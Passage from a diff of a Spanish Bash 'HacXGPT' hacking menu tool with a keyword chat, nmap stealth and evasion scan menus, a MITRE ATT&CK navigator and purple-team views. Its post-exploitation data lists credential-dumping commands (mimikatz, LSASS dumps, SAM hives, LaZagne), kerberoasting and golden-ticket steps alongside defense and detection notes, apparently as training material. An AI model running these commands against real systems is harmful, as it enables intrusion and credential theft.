+        local pdata="${CHAT_DATA[$topic]}"
+        
+        if [[ -z "$pdata" ]]; then
+            echo -e "${YELLOW}ℹ️  No hay datos estructurados para este tema.${NC}"
+            return 1
+        fi
+        
+        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${PURPLE}║  CHAT EXPERTO — ${CYAN}$title${NC}"
+        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+        echo -e "📊 Contexto aplicado contra: ${CYAN}${CHAT_TARGET}${NC}"
+        echo ""
+        
+        # Reemplazar CHAT_TARGET
+        pdata="${pdata//CHAT_TARGET/$CHAT_TARGET}"
+        
+        local temp="$pdata"
+        local delimiter="|||"
+        local secciones=()
+        while [[ "$temp" == *"$delimiter"* ]]; do
+            secciones+=("${temp%%"$delimiter"*}")
+            temp="${temp#*"$delimiter"}"
+        done
+        secciones+=("$temp")
+        
+        for seccion in "${secciones[@]}"; do
+            seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+            [[ -z "$seccion" ]] && continue
+            
+            if [[ "$seccion" == *"🔴"* ]]; then
+                echo -e "${RED}$seccion${NC}"
+            elif [[ "$seccion" == *"🔵"* ]]; then
+                echo -e "${BLUE}$seccion${NC}"
+            elif [[ "$seccion" == *"🟣"* ]]; then
+                echo -e "${PURPLE}$seccion${NC}"
+            elif [[ "$seccion" == *"📝"* ]]; then
+                echo -e "${YELLOW}$seccion${NC}"
+            else
+                echo -e "$seccion"
+            fi
+            echo ""
+        done
+        return 0
+    }
+
+    # Funciones de respuesta para cada tema
+    _chat_botnet() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "botnet" "Botnets y Command & Control (T1078/T1071)"
+    }
+
+    _chat_ddos() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "ddos" "Denegación de Servicio (DDoS)"
+    }
+
+    _chat_sql() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "sql" "Inyección SQL (SQLi)"
+    }
+
+    _chat_nmap() {
+        echo "🔍 NMAP - ESCANEO PROFESIONAL"
+        echo ""
+        echo "⚙️ COMANDOS ESENCIALES:"
+        echo "- nmap -sS -sV -p- [OBJETIVO]"
+        echo "- nmap -sS -T2 [OBJETIVO] (sigiloso)"
+        echo "- nmap -A -T4 [OBJETIVO] (agresivo)"
+        echo "- nmap -sU [OBJETIVO] (UDP - lento)"
+        echo ""
+        echo "🎯 TÉCNICAS ESPECIALES:"
+        echo "- Fragmentación: nmap -f"
+        echo "- Decoys: nmap -D RND:10"
+        echo "- Timing: -T0 a -T5"
+    }
+    _chat_xss() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "xss" "Cross-Site Scripting XSS (T1059.007)"
+    }
+
+    _chat_phishing() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "phishing" "Phishing e Ingeniería Social (T1566)"
+    }
+
+    _chat_hash() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "hash" "Hash Cracking y Credential Dumping (T1003/T1110)"
+    }
+
+    _chat_default() {
+        echo -e "${CYAN}ℹ️ No reconozco esa pregunta específica.${NC}"
+        echo ""
+        echo -e "${GREEN}🎯 Prueba con temas como:${NC}"
+        echo -e "  ${YELLOW}•${NC} 'ddos a 10.0.0.1'        ${YELLOW}•${NC} 'sql injection sobre sitio.com'"
+        echo -e "  ${YELLOW}•${NC} 'phishing'              ${YELLOW}•${NC} 'kerberoasting'"
+        echo -e "  ${YELLOW}•${NC} 'lolbins'               ${YELLOW}•${NC} 'pass the hash'"
+        echo -e "  ${YELLOW}•${NC} 'xss'                   ${YELLOW}•${NC} 'botnet'"
+        echo -e "  ${YELLOW}•${NC} 'cve'                   ${YELLOW}•${NC} 'apt29 / apt38 / fin7'"
+        echo -e "  ${YELLOW}•${NC} 'sabias que'            ${YELLOW}•${NC} 't1003 / t1566 / t1059'"
+    }
+
+    # Array asociativo: palabra_clave → función_de_respuesta
+    # (requiere bash >= 4.0)
+    declare -A chat_dispatch
+    chat_dispatch["botnet"]="_chat_botnet"
+    chat_dispatch["ddos"]="_chat_ddos"
+    chat_dispatch["denegacion"]="_chat_ddos"
+    chat_dispatch["sql"]="_chat_sql"
+    chat_dispatch["inyeccion"]="_chat_sql"
+    chat_dispatch["nmap"]="_chat_nmap"
+    chat_dispatch["escaneo"]="_chat_nmap"
+    chat_dispatch["xss"]="_chat_xss"
+    chat_dispatch["phishing"]="_chat_phishing"
+    chat_dispatch["hash"]="_chat_hash"
+    chat_dispatch["descifrar"]="_chat_hash"
+    chat_dispatch["contraseña"]="_chat_hash"
+    # === NUEVOS keywords MITRE / experto ===
+    chat_dispatch["cve"]="_chat_cve"
+    chat_dispatch["kerberoasting"]="_chat_kerberoasting"
+    chat_dispatch["kerb"]="_chat_kerberoasting"
+    chat_dispatch["lolbin"]="_chat_lolbins"
+    chat_dispatch["lolbins"]="_chat_lolbins"
+    chat_dispatch["pass the hash"]="_chat_pth"
+    chat_dispatch["pth"]="_chat_pth"
+    chat_dispatch["apt29"]="_chat_apt29"
+    chat_dispatch["cozy bear"]="_chat_apt29"
+    chat_dispatch["apt38"]="_chat_apt38"
+    chat_dispatch["lazarus"]="_chat_apt38"
+    chat_dispatch["fin7"]="_chat_fin7"
+    chat_dispatch["carbanak"]="_chat_fin7"
+    chat_dispatch["sabias que"]="_chat_trivia"
+    chat_dispatch["sabias"]="_chat_trivia"
+    chat_dispatch["t1003"]="_chat_mitre_t1003"
+    chat_dispatch["t1566"]="_chat_mitre_t1566"
+    chat_dispatch["t1059"]="_chat_mitre_t1059"
+    chat_dispatch["t1055"]="_chat_mitre_t1055"
+
+    # Funciones de respuesta para nuevos temas
+    _chat_cve() {
+        _show_chat_topic "cve" "Top CVEs 2024-2025"
+    }
+
+    _chat_kerberoasting() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "kerberoasting" "Kerberoasting (T1558.003)"
+    }
+
+    _chat_lolbins() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "lolbins" "Living Off The Land Binaries (T1218)"
+    }
+
+    _chat_pth() {
+        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
+        _show_chat_topic "pth" "Pass-the-Hash (T1550.002)"
+    }
+
+    _chat_apt29() {
+        _show_chat_topic "apt29" "APT29 / Cozy Bear (SVR Rusia)"
+    }
+
+    _chat_apt38() {
+        _show_chat_topic "apt38" "APT38 / Lazarus Group (RPDC)"
+    }
+
+    _chat_fin7() {
+        _show_chat_topic "fin7" "FIN7 / Carbanak (Crimen Organizado)"
+    }
+
+    _chat_trivia() {
+        _show_chat_topic "trivia" "¿Sabías que? — Threat Intelligence 2024-2025"
+    }
+
+    _chat_mitre_t1003() {
+        _show_purple_technique "T1003"
+    }
+    _chat_mitre_t1566() {
+        _show_purple_technique "T1566"
+    }
+    _chat_mitre_t1059() {
+        _show_purple_technique "T1059"
+    }
+    _chat_mitre_t1055() {
+        _show_purple_technique "T1055"
+    }
+
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║          ${GREEN}💬 CHAT LIBRE TÉCNICO${CYAN}              ║${NC}"
+        echo -e "${CYAN}║   ${YELLOW}Hacking · MITRE ATT&CK · CVEs · APTs${CYAN}    ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+
+        echo -e "${GREEN}📚 TEMAS DISPONIBLES:${NC}"
+        echo -e "${BLUE}• botnet, ddos, sql, xss, phishing, hash${NC}"
+        echo -e "${PURPLE}• cve${NC}          - Top CVEs 2024-2025 con CVSS"
+        echo -e "${PURPLE}• kerberoasting${NC} - T1558.003 detallado"
+        echo -e "${PURPLE}• lolbins${NC}       - Living Off The Land Binaries"
+        echo -e "${PURPLE}• pass the hash${NC} - T1550.002 con comandos"
+        echo -e "${RED}• apt29, apt38, fin7${NC} - Perfiles de APT"
+        echo -e "${YELLOW}• sabias que${NC}    - Dato de inteligencia de amenazas"
+        echo -e "${CYAN}• t1003, t1566, t1059, t1055${NC} - Purple Team por ID"
+        echo ""
+        echo -e "${RED}📝 Escribe 'salir' para volver al menú${NC}"
+        echo ""
+
+        read -p "❓ Tu pregunta: " pregunta
+
+        pregunta_lower=$(echo "$pregunta" | tr '[:upper:]' '[:lower:]')
+
+        # Extraer dominio/IP de la pregunta
+        local extracted_domain=""
+        if [[ "$pregunta_lower" =~ ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-z0-9.-]+\.[a-z]{2,}) ]]; then
+            extracted_domain="${BASH_REMATCH[1]}"
+        fi
+        
+        # Determinar CHAT_TARGET
+        unset CHAT_TARGET
+        if [[ -n "$extracted_domain" ]]; then
+            export CHAT_TARGET="$extracted_domain"
+            echo -e "  ${GREEN}✅ Objetivo temporal detectado para el chat: ${CYAN}$CHAT_TARGET${NC}"
+            sleep 1
+        elif [[ -n "$TARGET" ]]; then
+            export CHAT_TARGET="$TARGET"
+        else
+            echo ""
+            read -p "🎯 (Opcional) No se detectó objetivo. Ingresa IP/Dominio para contexto: " CHAT_TARGET
+            [[ -z "$CHAT_TARGET" ]] && export CHAT_TARGET="[OBJETIVO]"
+        fi
+
+        if [[ "$pregunta_lower" == "salir" ]]; then
+            echo ""
+            echo "Regresando al menú principal..."
+            sleep 1
+            return
+        fi
+
+        echo ""
+        echo "🤖 HacXGPT:"
+        echo "══════════════════════════════════════════════"
+
+        # Buscar coincidencia en el array asociativo
+        matched_fn=""
+        for keyword in "${!chat_dispatch[@]}"; do
+            if [[ "$pregunta_lower" == *"$keyword"* ]]; then
+                matched_fn="${chat_dispatch[$keyword]}"
+                break
+            fi
+        done
+
+        if [[ -n "$matched_fn" ]]; then
+            output=$("$matched_fn")
+            echo "$output"
+            save_output "[$pregunta] $output"
+        else
+            _chat_with_ollama "$pregunta"
+        fi
+
+        echo "══════════════════════════════════════════════"
+        echo ""
+        read -p "💬 Otra pregunta? (Enter para salir): " continuar
+        if [[ -z "$continuar" ]]; then
+            return
+        fi
+    done
+}
+
+# ============================================
+# 8. ESCANEO SIGILOSO (IMPLEMENTADO)
+# ============================================
+escaneo_sigiloso() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║          ${GREEN}🔍 ESCANEO SIGILOSO${CYAN}                ║${NC}"
+        echo -e "${CYAN}║      ${YELLOW}Técnicas avanzadas de escaneo${CYAN}        ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}🎯 TÉCNICAS DE ESCANEO SIGILOSO:${NC}"
+        echo ""
+        echo "1. Escaneo TCP SYN (Stealth)"
+        echo "2. Escaneo XMAS Tree"
+        echo "3. Escaneo FIN"
+        echo "4. Escaneo NULL"
+        echo "5. Escaneo UDP"
+        echo "6. Técnicas de evasión"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                read -p "🎯 Objetivo para SYN Stealth: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 ESCANEO TCP SYN STEALTH:${NC}"
+                    echo ""
+                    echo "• Comando básico: nmap -sS $objetivo"
+                    echo "• Con timing lento: nmap -sS -T2 $objetivo"
+                    echo "• Puertos específicos: nmap -sS -p 80,443,22 $objetivo"
+                    echo "• Sin ping: nmap -sS -Pn $objetivo"
+                    echo ""
+                    echo "📊 EXPLICACIÓN:"
+                    echo "Envía paquetes SYN y analiza respuestas SYN-ACK"
+                    echo "No completa el handshake TCP (más sigiloso)"
+                fi
+                ;;
+            2)
+                read -p "🎯 Objetivo para XMAS Tree: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🎄 ESCANEO XMAS TREE:${NC}"
+                    echo ""
+                    echo "• Comando: nmap -sX $objetivo"
+                    echo "• Con opciones: nmap -sX -T2 $objetivo"
+                    echo ""
+                    echo "📊 EXPLICACIÓN:"
+                    echo "Envía paquetes con flags FIN, URG y PUSH activados"
+                    echo "Como un árbol de Navidad (XMAS)"
+                fi
+                ;;
+            3)
+                read -p "🎯 Objetivo para FIN Scan: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🏁 ESCANEO FIN:${NC}"
+                    echo ""
+                    echo "• Comando: nmap -sF $objetivo"
+                    echo "• Variante: nmap -sF -f $objetivo (fragmentado)"
+                    echo ""
+                    echo "📊 EXPLICACIÓN:"
+                    echo "Envía paquetes solo con flag FIN activado"
+                    echo "Útil para evadir firewalls simples"
+                fi
+                ;;
+            4)
+                read -p "🎯 Objetivo para NULL Scan: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🚫 ESCANEO NULL:${NC}"
+                    echo ""
+                    echo "• Comando: nmap -sN $objetivo"
+                    echo ""
+                    echo "📊 EXPLICACIÓN:"
+                    echo "Envía paquetes sin ningún flag activado"
+                    echo "Completamente 'null'"
+                fi
+                ;;
+            5)
+                read -p "🎯 Objetivo para UDP Scan: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}📨 ESCANEO UDP:${NC}"
+                    echo ""
+                    echo "• Comando: nmap -sU $objetivo"
+                    echo "• Puertos comunes: nmap -sU -F $objetivo"
+                    echo "• Todos los puertos: nmap -sU -p- $objetivo (MUY LENTO)"
+                    echo ""
+                    echo "⚠️ ADVERTENCIA:"
+                    echo "Los escaneos UDP son muy lentos"
+                    echo "Puede tomar horas para todos los puertos"
+                fi
+                ;;
+            6)
+                echo ""
+                echo -e "${YELLOW}🎭 TÉCNICAS DE EVASIÓN:${NC}"
+                echo ""
+                echo "• Fragmentación: nmap -f"
+                echo "• MTU personalizado: nmap --mtu 16"
+                echo "• Decoys: nmap -D RND:10"
+                echo "• Spoofing: nmap -S [IP_FALSA]"
+                echo "• Source port: nmap --source-port 53"
+                echo "• Timing aleatorio: nmap --scan-delay 5s"
+                echo "• Data length: nmap --data-length 50"
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================================
+# 9. MATRIZ MITRE ATT&CK — NAVEGADOR COMPLETO
+# ============================================================
+mitre_menu() {
+    preguntar_objetivo || return
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║        ${GREEN}🎯 MATRIZ MITRE ATT&CK v14${CYAN}              ║${NC}"
+        echo -e "${CYAN}║      ${YELLOW}Enterprise Matrix — 14 Tácticas${CYAN}           ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${GREEN}TÁCTICAS ENTERPRISE:${NC}"
+        echo ""
+        local idx=1
+        for tid in "${MITRE_ORDEN[@]}"; do
+            printf "  ${YELLOW}%2d.${NC} ${CYAN}[%s]${NC} %s\n" "$idx" "$tid" "${MITRE_TACTICAS[$tid]}"
+            ((idx++))
+        done
+        echo -e "  ${RED} 0. Volver al menú principal${NC}"
+        echo ""
+        read -p "🎯 Selecciona táctica [0-14]: " sel
+        [[ "$sel" == "0" ]] && return
+        if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= 14 )); then
+            local tactica_id="${MITRE_ORDEN[$((sel-1))]}"
+            local tactica_nombre="${MITRE_TACTICAS[$tactica_id]}"
+            # Mostrar técnicas de esa táctica
+            while true; do
+                show_banner
+                echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+                echo -e "${PURPLE}║  ${CYAN}[$tactica_id]${NC} ${GREEN}${tactica_nombre}${NC}"
+                echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+                echo ""
+                echo -e "${YELLOW}TÉCNICAS CLAVE:${NC}"
+                echo ""
+                local tecnicas_str="${MITRE_TECNICAS[$tactica_id]}"
+                IFS='|' read -ra tecnicas <<< "$tecnicas_str"
+                local tidx=1
+                for tec in "${tecnicas[@]}"; do
+                    local tid_t="${tec%%:*}"
+                    local tname="${tec##*:}"
+                    printf "  ${YELLOW}%d.${NC} ${CYAN}%-12s${NC} %s\n" "$tidx" "$tid_t" "$tname"
+                    ((tidx++))
+                done
+                echo ""
+                echo -e "  ${BLUE}L. Ver en modo Purple Team (Ataque+Defensa)${NC}"
+                echo -e "  ${RED}0. Volver${NC}"
+                echo ""
+                read -p "🔍 Selecciona técnica o [L/0]: " tsel
+                [[ "$tsel" == "0" ]] && break
+                if [[ "${tsel,,}" == "l" ]]; then
+                    # Mostrar purple team de la primera técnica
+                    local first_id="${tecnicas[0]%%:*}"
+                    _show_purple_technique "$first_id"
+                elif [[ "$tsel" =~ ^[0-9]+$ ]] && (( tsel >= 1 && tsel < tidx )); then
+                    local sel_tec="${tecnicas[$((tsel-1))]}"
+                    local sel_id="${sel_tec%%:*}"
+                    _show_mitre_technique "$sel_id"
+                fi
+                echo ""
+                read -p "↵ Presiona Enter para continuar..." _
+            done
+        fi
+    done
+}
+
+# Helper: muestra técnica básica MITRE con su descripción y ataque
+_show_mitre_technique() {
+    local tech_id="${1^^}"
+    local pdata="${PURPLE_DATA[$tech_id]}"
+    
+    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║  MITRE ATT&CK — ${CYAN}$tech_id${NC}"
+    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    echo ""
+    
+    # Reemplazar TARGET
+    pdata="${pdata//TARGET/$TARGET}"
+    
+    # Separar por ||| y mostrar
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        elif [[ "$seccion" == *"📝"* ]]; then
+            echo -e "${YELLOW}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
+}
+
+# Helper: muestra vista Purple Team de una técnica por ID
+_show_purple_technique() {
+    local tech_id="${1^^}"
+    local pdata="${PURPLE_DATA[$tech_id]}"
+    
+    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║  PURPLE TEAM — ${CYAN}$tech_id${NC}"
+    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+    
+    if [[ -z "$pdata" ]]; then
+        echo -e "${YELLOW}ℹ️  No hay datos Purple Team detallados para $tech_id.${NC}"
+        echo -e "    Consulta: https://attack.mitre.org/techniques/$tech_id"
+        return
+    fi
+    
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    
+    # Reemplazar TARGET
+    pdata="${pdata//TARGET/$TARGET}"
+    
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
+}
+
+# ============================================================
+# 10. MODO PURPLE TEAM
+# ============================================================
+modo_purple_team() {
+    while true; do
+        show_banner
+        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+        echo -e "${PURPLE}║          ${RED}🔴 RED${NC} ${CYAN}+${NC} ${BLUE}🔵 BLUE${NC} ${CYAN}+${NC} ${PURPLE}🟣 PURPLE TEAM       ${PURPLE}║${NC}"
+        echo -e "${PURPLE}║     ${YELLOW}Técnica por técnica: Ataque & Defensa${NC}     ${PURPLE}║${NC}"
+        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${GREEN}TÉCNICAS PURPLE TEAM DISPONIBLES:${NC}"
+        echo ""
+        local teclist=(T1003 T1027 T1055 T1059 T1078 T1021 T1053 T1190 T1566 T1562)
+        local tidx=1
+        for t in "${teclist[@]}"; do
+            # Obtener nombre de la primera línea del PURPLE_DATA
+            local linea
+            linea=$(echo "${PURPLE_DATA[$t]}" | grep -m1 "ATAQUE" | sed 's/🔴 ATAQUE — //' | sed 's/://')
+            printf "  ${YELLOW}%2d.${NC} ${CYAN}%-8s${NC} %s\n" "$tidx" "$t" "$linea"
+            ((tidx++))
+        done
+        echo ""
+        echo -e "  ${BLUE}M. Buscar por ID de técnica (ej: T1003)${NC}"
+        echo -e "  ${RED}0. Volver${NC}"
+        echo ""
+        read -p "🟣 Selecciona [1-${#teclist[@]}, M, 0]: " sel
+
+        case "${sel,,}" in
+            0) return ;;
+            m)
+                read -p "   Ingresa ID de técnica (ej: T1003): " tid_input
+                if preguntar_objetivo; then
+                    _show_purple_technique "${tid_input^^}"
+                    read -p "↵ Enter para continuar..." _
+                fi
+                ;;
+            *)
+                if preguntar_objetivo; then
+                    case $sel in
+                        1) _show_purple_technique "T1003" ;;
+                        2) _show_purple_technique "T1027" ;;
+                        3) _show_purple_technique "T1055" ;;
+                        4) _show_purple_technique "T1059" ;;
+                        5) _show_purple_technique "T1078" ;;
+                        6) _show_purple_technique "T1021" ;;
+                        7) _show_purple_technique "T1053" ;;
+                        8) _show_purple_technique "T1190" ;;
+                        9) _show_purple_technique "T1566" ;;
+                        10) _show_purple_technique "T1562" ;;
+                    esac
+                    read -p "↵ Enter para continuar..." _
+                fi
+                ;;
+        esac
+    done
+}
+
+# ============================================================
+# 11. POST-EXPLOTACIÓN (Windows + Linux + Evasión)
+# ============================================================
+
+declare -A WIN_DATA
+WIN_DATA[1]="🔴 ATAQUE:
+  • mimikatz.exe privilege::debug sekurlsa::logonpasswords
+  • procdump.exe -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp
+  • python3 secretsdump.py DOMAIN/user:pass@TARGET
+  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive
+  • comsvcs.dll: rundll32.exe comsvcs.dll MiniDump \$(PID) lsass.dmp full
+|||
+🔵 DEFENSA:
+  • Activar Windows Defender Credential Guard
+  • Protected Users Security Group en Active Directory
+  • Deshabilitar WDigest: UseLogonCredential = 0
+  • gMSA/MSA en lugar de cuentas de servicio normales
+|||
+🟣 DETECCIÓN:
+  • Event ID 4656/4663: acceso a handle de LSASS
+  • Sysmon Event ID 10: ProcessAccess → lsass.exe
+  • Alertar si procdump/comsvcs acceden a LSASS"
+
+WIN_DATA[2]="🔴 ATAQUE:
+  • SharpDPAPI.exe credentials /password:Passw0rd
+  • python3 dpapi.py masterkey /in:key /password:pass
+  • Get-ChildItem 'HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'
+  • Dump Chrome: copy 'AppData\\Local\\Google\\Chrome\\Default\\Login Data' /tmp/
+  • LaZagne.exe all → extrae credenciales de 30+ aplicaciones
+|||
+🔵 DEFENSA:
+  • Gestores de contraseñas corporativos (CyberArk, BeyondTrust)
+  • Monitorear acceso a archivos de credenciales del browser
+  • Browser Enterprise Policies: bloquear exportación de contraseñas
+|||
+🟣 DETECCIÓN:
+  • FileSystemAudit: acceso a Login Data / Cookies de Chrome/Firefox
+  • Alertar en: dpapi, LaZagne, SharpDPAPI en EDR"
+
+WIN_DATA[3]="🔴 ATAQUE:
+  1. Enumerar SPNs:
+     GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP
+     setspn -T DOMAIN -Q */*
+  
+  2. Solicitar TGS tickets:
+     Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
+     GetUserSPNs.py DOMAIN/user:pass -request
+  
+  3. Crackear offline:
+     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+     john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
+|||
+🔵 DEFENSA:
+  • Usar AES-256 en lugar de RC4 para cuentas de servicio (MSA/gMSA)
+  • Contraseñas >25 chars en cuentas de servicio → 100 años crackear
+  • Auditar cuentas con SPN: deben ser mínimas y monitoreadas
+|||
+🟣 DETECCIÓN:
+  • Event ID 4769 (A): solicitud de TGS → muchas en poco tiempo = alerta
+  • Filtrar: Ticket Encryption Type = 0x17 (RC4-HMAC → vulnerable)
+  • SIEM: correlacionar 4769 masivo desde misma cuenta/IP"
+
+WIN_DATA[4]="🔴 ATAQUE:
+  • Robar ticket: Rubeus.exe dump /service:krbtgt
+  • Importar ticket: Rubeus.exe ptt /ticket:ticket.kirbi
+  • Golden Ticket: mimikatz kerberos::golden /user:admin /domain:DOM /sid:S-1-5 /krbtgt:HASH /ptt
+  • Silver Ticket: mimikatz kerberos::golden /user:admin /target:server /service:cifs /rc4:HASH /ptt
+  • Acceder recursos: dir \\\\target\\C$
+|||
+🔵 DEFENSA:
+  • Cambiar contraseña de KRBTGT 2 veces (invalida todos los Golden Tickets)
+  • Privileged Access Workstations (PAW) — aísla credenciales admin
+  • Monitorear cuentas con atributos anómalos (SID history, etc.)
+|||
+🟣 DETECCIÓN:
+  • Event ID 4768: TGT request con atributos anómalos
+  • Event ID 4769: TGS con cifrado 0x17 + cuenta sin SPN
+  • Ticket con lifetime >10h o sin pasar por DC → Golden Ticket"
+
+WIN_DATA[5]="🔴 ATAQUE:
+  • systeminfo && whoami /all && net user && net localgroup administrators
+  • Get-ComputerInfo | Select *OS*, *Domain*
+  • wmic computersystem get model, manufacturer, systemtype
+  • tasklist /V && netstat -ano && ipconfig /all
+|||
+🔵 DEFENSA:
+  • JEA: limitar qué comandos puede ejecutar cada rol
+  • Detectar reconocimiento excesivo en endpoint
+|||
+🟣 DETECCIÓN:
+  • Sysmon ID 1: ejecución de systeminfo, whoami, net en cadena rápida
+  • Correlacionar: 5+ comandos de discovery en <2 minutos → alerta"
+
+WIN_DATA[6]="🔴 ATAQUE:
+  • SharpHound.exe --CollectionMethods All --ZipFileName output.zip
+  • bloodhound-python -u user -p pass -d DOMAIN.LOCAL -ns DC_IP -c all
+  • PowerView: Get-DomainComputer -Properties *
+  • net view /domain → listar máquinas en dominio
+|||
+🔵 DEFENSA:
+  • Tier model: separar cuentas admin Tier 0/1/2
+  • Monitorear cuentas que hacen bulk LDAP queries
+|||
+🟣 DETECCIÓN:
+  • Event ID 4661: muchas consultas LDAP desde una cuenta en poco tiempo
+  • NetFlow: consultas SMB masivas a muchos hosts = lateral discovery"
+
+_show_post_exploitation() {
+    local array_val="$1"
+    local title="$2"
+    
+    echo -e "${RED}╔══ ${title} ════════════════════════════════╗${NC}"
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    
+    local pdata="${array_val//TARGET/$TARGET}"
+    
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
+}
+
+post_explotacion_windows() {
+    while true; do
+        show_banner
+        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
